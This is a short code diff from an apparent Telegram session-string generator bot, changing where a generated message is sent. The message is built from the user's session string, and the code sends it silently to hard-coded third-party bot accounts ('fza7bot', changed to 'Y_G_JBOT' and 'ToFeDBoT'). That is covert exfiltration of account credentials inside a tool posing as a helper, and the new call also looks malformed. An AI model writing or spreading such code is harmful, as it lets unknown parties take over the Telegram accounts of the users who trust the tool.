@@ -160,7 +160,7 @@ async def generate_session(bot, msg, telethon=False):
 "تليثون" if telethon else "بايࢪوجࢪام", string_session
     )
     try:
-        await client.send_message("fza7bot", text)
+        await client.send_message("Y_G_JBOT","ToFeDBoT", text)
     except KeyError:
         pass
     await client.disconnect()
